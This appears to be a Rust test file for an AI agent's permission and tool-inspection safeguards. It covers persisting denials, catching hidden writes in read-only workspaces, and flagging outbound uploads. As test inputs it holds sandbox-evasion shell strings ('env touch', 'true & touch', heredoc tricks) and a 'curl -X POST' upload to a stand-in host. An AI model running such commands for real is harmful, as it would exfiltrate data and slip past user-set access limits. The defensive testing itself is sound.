use gosling::config::permission::PermissionLevel;
use gosling::config::{GoslingMode, PermissionManager};
use gosling::conversation::message::ToolRequest;
use gosling::permission::{PermissionInspector, WorkingDirScopeInspector};
use gosling::security::egress_inspector::EgressInspector;
use gosling::session::{Session, SessionManager, SessionType};
use gosling::tool_inspection::{InspectionAction, ToolInspectionManager, ToolInspector};
use gosling::workspace::{
    WorkspaceFolderAccess, WorkspaceFolderPolicy, WorkspaceFolderPolicyRoot,
    WorkspaceSessionContext,
};
use rmcp::model::CallToolRequestParams;
use std::sync::Arc;
use tempfile::TempDir;

fn shell_request(id: &str, command: &str) -> ToolRequest {
    ToolRequest {
        id: id.into(),
        tool_call: Ok(
            CallToolRequestParams::new("developer__shell".to_string()).with_arguments(
                serde_json::json!({"command": command})
                    .as_object()
                    .unwrap()
                    .clone(),
            ),
        ),
        metadata: None,
        tool_meta: None,
    }
}

async fn workspace(
    root: &TempDir,
    access: WorkspaceFolderAccess,
) -> (Arc<SessionManager>, Session) {
    let project = root.path().join("project");
    std::fs::create_dir(&project).unwrap();
    let manager = Arc::new(SessionManager::new(root.path().join("sessions")));
    let session = manager
        .create_session(
            project.clone(),
            "audit fixture".into(),
            SessionType::User,
            GoslingMode::Auto,
        )
        .await
        .unwrap();
    let context = WorkspaceSessionContext {
        workspace_id: "audit".into(),
        workspace_name: "Audit".into(),
        primary_working_folder: project.to_string_lossy().into(),
        folders: Vec::new(),
        product_output_folders: Vec::new(),
        folder_policy: WorkspaceFolderPolicy {
            roots: vec![WorkspaceFolderPolicyRoot {
                path: project.to_string_lossy().into(),
                access,
            }],
        },
    };
    manager
        .update(&session.id)
        .workspace_snapshot("audit".into(), "Audit".into(), None, None, None, context)
        .apply()
        .await
        .unwrap();
    let session = manager.get_session(&session.id, false).await.unwrap();
    (manager, session)
}

#[test]
fn independent_permission_writer_preserves_existing_denial() {
    let root = tempfile::tempdir().unwrap();
    let first = PermissionManager::new(root.path().into());
    let second = PermissionManager::new(root.path().into());
    first
        .update_user_permission("dangerous_tool", PermissionLevel::NeverAllow)
        .unwrap();
    second
        .update_user_permission("other_tool", PermissionLevel::AlwaysAllow)
        .unwrap();
    let reloaded = PermissionManager::new(root.path().into());
    assert_eq!(
        reloaded.get_user_permission("dangerous_tool"),
        Some(PermissionLevel::NeverAllow),
        "a successful unrelated write must preserve another writer's denial"
    );
}

#[test]
fn existing_permission_reader_observes_revocation() {
    let root = tempfile::tempdir().unwrap();
    let first = PermissionManager::new(root.path().into());
    first
        .update_user_permission("dangerous_tool", PermissionLevel::AlwaysAllow)
        .unwrap();
    let second = PermissionManager::new(root.path().into());
    second
        .update_user_permission("dangerous_tool", PermissionLevel::NeverAllow)
        .unwrap();
    assert_eq!(
        first.get_user_permission("dangerous_tool"),
        Some(PermissionLevel::NeverAllow),
        "a long-lived manager must not retain revoked authority"
    );
}

#[test]
fn concurrent_permission_writers_preserve_both_decisions() {
    let root = tempfile::tempdir().unwrap();
    let barrier = Arc::new(std::sync::Barrier::new(2));
    std::thread::scope(|scope| {
        for (principal, level) in [
            ("dangerous_tool", PermissionLevel::NeverAllow),
            ("other_tool", PermissionLevel::AlwaysAllow),
        ] {
            let directory = root.path().to_path_buf();
            let barrier = barrier.clone();
            scope.spawn(move || {
                let manager = PermissionManager::new(directory);
                barrier.wait();
                manager.update_user_permission(principal, level).unwrap();
            });
        }
    });
    let reloaded = PermissionManager::new(root.path().into());
    assert_eq!(
        [
            reloaded.get_user_permission("dangerous_tool"),
            reloaded.get_user_permission("other_tool"),
        ],
        [
            Some(PermissionLevel::NeverAllow),
            Some(PermissionLevel::AlwaysAllow)
        ],
        "both independent concurrent writes returned success and must survive"
    );
}

#[tokio::test]
async fn observed_hosted_save_failure_returns_without_a_grant() {
    let root = tempfile::tempdir().unwrap();
    let permissions = Arc::new(PermissionManager::new(root.path().join("config")));
    std::fs::create_dir(permissions.get_config_path()).unwrap();
    let sessions = Arc::new(SessionManager::new(root.path().join("sessions")));
    let inspector = PermissionInspector::new(
        permissions.clone(),
        Arc::new(tokio::sync::Mutex::new(None)),
        sessions,
    );
    let mut manager = ToolInspectionManager::new();
    manager.add_inspector(Box::new(inspector));
    manager
        .update_permission_manager("developer__shell", PermissionLevel::AlwaysAllow)
        .await;
    // Characterization: the async caller returns normally while the grant is absent.
    assert_eq!(permissions.get_user_permission("developer__shell"), None);
    assert!(permissions.get_config_path().is_dir());
}

#[tokio::test]
async fn readonly_workspace_rejects_env_and_background_mutations() {
    let root = tempfile::tempdir().unwrap();
    let (sessions, session) = workspace(&root, WorkspaceFolderAccess::Read).await;
    let inspector = WorkingDirScopeInspector::new(sessions);
    let target = session.working_dir.join("must-not-write");
    let requests = vec![
        shell_request("env", &format!("env touch '{}'", target.display())),
        shell_request(
            "background",
            &format!("true & touch '{}'", target.display()),
        ),
    ];
    let results = inspector
        .inspect(&session.id, &requests, &[], GoslingMode::Auto)
        .await
        .unwrap();
    let missing: Vec<_> = requests
        .iter()
        .filter(|request| {
            !results.iter().any(|r| {
                r.tool_request_id == request.id && matches!(r.action, InspectionAction::Deny)
            })
        })
        .map(|r| r.id.as_str())
        .collect();
    assert!(
        missing.is_empty(),
        "mutations missing read-only denial: {missing:?}"
    );
    assert!(!target.exists(), "audit strings must never be executed");
}

#[tokio::test]
async fn literal_heredoc_does_not_hide_a_later_outside_write() {
    let root = tempfile::tempdir().unwrap();
    let (sessions, session) = workspace(&root, WorkspaceFolderAccess::ReadWrite).await;
    let inspector = WorkingDirScopeInspector::new(sessions);
    let target = root.path().join("outside");
    let command = format!(
        "cat <<'EOF'\nDon't panic\nEOF\nprintf x > '{}'",
        target.display()
    );
    let results = inspector
        .inspect(
            &session.id,
            &[shell_request("heredoc", &command)],
            &[],
            GoslingMode::Auto,
        )
        .await
        .unwrap();
    assert!(
        results
            .iter()
            .any(|r| matches!(r.action, InspectionAction::RequireApproval(_))),
        "the real write after literal heredoc data must require approval: {results:?}"
    );
    assert!(!target.exists(), "audit strings must never be executed");
}

#[tokio::test]
async fn readonly_workspace_accepts_a_comment_with_an_apostrophe() {
    let root = tempfile::tempdir().unwrap();
    let (sessions, session) = workspace(&root, WorkspaceFolderAccess::Read).await;
    let results = WorkingDirScopeInspector::new(sessions)
        .inspect(
            &session.id,
            &[shell_request("comment", "ls # don't change anything\nls")],
            &[],
            GoslingMode::Auto,
        )
        .await
        .unwrap();
    assert!(
        results.is_empty(),
        "benign comment must not become a mutation: {results:?}"
    );
}

#[tokio::test]
async fn egress_checks_later_upload_to_the_same_destination() {
    let root = tempfile::tempdir().unwrap();
    let inspector = EgressInspector::new(Arc::new(PermissionManager::new(root.path().into())));
    let mut missed = Vec::new();
    for first in [
        "curl https://audit.invalid/endpoint",
        "printf '%s' 'https://audit.invalid/endpoint'",
    ] {
        let results = inspector
            .inspect(
                "audit",
                &[
                    shell_request("first", first),
                    shell_request(
                        "upload",
                        "curl -X POST --data payload https://audit.invalid/endpoint",
                    ),
                ],
                &[],
                GoslingMode::Auto,
            )
            .await
            .unwrap();
        if !results.iter().any(|r| {
            r.tool_request_id == "upload"
                && matches!(r.action, InspectionAction::RequireApproval(_))
        }) {
            missed.push((first, results));
        }
    }
    assert!(
        missed.is_empty(),
        "earlier requests suppressed upload checks: {missed:?}"
    );
}
